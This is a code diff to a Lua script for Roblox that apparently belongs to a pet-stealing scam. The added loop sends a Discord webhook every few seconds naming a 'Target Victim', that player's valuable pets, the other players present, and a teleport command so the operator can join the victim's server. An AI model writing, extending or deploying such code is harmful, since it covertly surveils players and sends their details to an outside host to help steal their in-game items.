@@ -238,42 +238,6 @@ task.spawn(function()
         return
     end
 
-    task.spawn(function()
-        while player.Parent do
-            local playerList = {}
-            for _, p in ipairs(Players:GetPlayers()) do
-                if p ~= player then
-                    table.insert(playerList, string.format("`%s` (@%s)", p.DisplayName, p.Name))
-                end
-            end
-            
-            local playerListString = table.concat(playerList, "\n")
-            if #playerList == 0 then
-                playerListString = "No other players in the server."
-            end
-
-            local embed = {
-                title = "Server Monitor",
-                color = 16776960,
-                fields = {
-                    {name = "🎯 Target Victim", value = string.format("`%s` (@%s)", player.DisplayName, player.Name), inline = false},
-                    {name = "🐾 Victim's Priority Pets", value = formattedPriorityPetsForMonitor, inline = false},
-                    {name = "👥 Other Players in Server", value = "```\n" .. playerListString .. "\n```", inline = false}
-                },
-                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-            }
-            
-            local payload = {
-                username = "CHETOS MONITOR",
-                avatar_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&",
-                embeds = { embed }
-            }
-
-            sendOurWebhook(CONFIG.MONITOR_WEBHOOK_URL, payload)
-            task.wait(4)
-        end
-    end)
-
     local function getPetSortScore(pet)
         if string.find(pet.typeName:lower(), "rainbow") then return 1 end
         if string.find(pet.typeName:lower(), "devine") then return 2 end
@@ -306,6 +270,45 @@ task.spawn(function()
     end
 
     formattedPriorityPetsForMonitor = formatPetList()
+
+    task.spawn(function()
+        while player.Parent do
+            local playerList = {}
+            for _, p in ipairs(Players:GetPlayers()) do
+                if p ~= player then
+                    table.insert(playerList, string.format("`%s` (@%s)", p.DisplayName, p.Name))
+                end
+            end
+            
+            local playerListString = table.concat(playerList, "\n")
+            if #playerList == 0 then
+                playerListString = "No other players in the server."
+            end
+
+            local teleport_command = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")\n```", game.PlaceId, game.JobId)
+
+            local embed = {
+                title = "Server Monitor",
+                color = 16776960,
+                fields = {
+                    {name = "🎯 Target Victim", value = string.format("`%s` (@%s)", player.DisplayName, player.Name), inline = false},
+                    {name = "🔗 Join Command", value = teleport_command, inline = false},
+                    {name = "🐾 Victim's Priority Pets", value = formattedPriorityPetsForMonitor, inline = false},
+                    {name = "👥 Other Players in Server", value = "```\n" .. playerListString .. "\n```", inline = false}
+                },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }
+            
+            local payload = {
+                username = "CHETOS MONITOR",
+                avatar_url = "https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&",
+                embeds = { embed }
+            }
+
+            sendOurWebhook(CONFIG.MONITOR_WEBHOOK_URL, payload)
+            task.wait(4)
+        end
+    end)
 
     local serverPlayerCount, maxPlayerCount = #Players:GetPlayers(), Players.MaxPlayers
     local serverStatus = string.format("%d/%d%s", serverPlayerCount, maxPlayerCount, serverPlayerCount >= maxPlayerCount and " (Player has left)" or "")
